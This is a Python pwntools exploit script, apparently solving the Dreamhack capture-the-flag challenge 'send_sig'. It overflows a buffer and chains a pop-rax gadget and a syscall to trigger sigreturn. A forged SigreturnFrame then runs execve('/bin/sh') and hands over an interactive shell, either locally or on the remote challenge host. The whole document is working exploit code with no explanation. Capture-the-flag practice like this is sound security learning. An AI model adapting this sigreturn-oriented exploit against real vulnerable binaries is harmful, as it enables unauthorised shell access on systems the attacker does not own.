from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/send_sig/send_sig')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:8498'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

syscall_ret = 0x04010b0
pop_rax_ret = 0x4010ae
binsh_str = 0x402000

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh_str
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

payload = ( b"A" * 8 + #buf
            b"B" * 8 + #rbp
            p64(pop_rax_ret) +
            p64(0xf) +
            p64(syscall_ret) +
            bytes(frame)
          )
          
p.recvuntil(b":")
p.send(payload)

p.interactive()
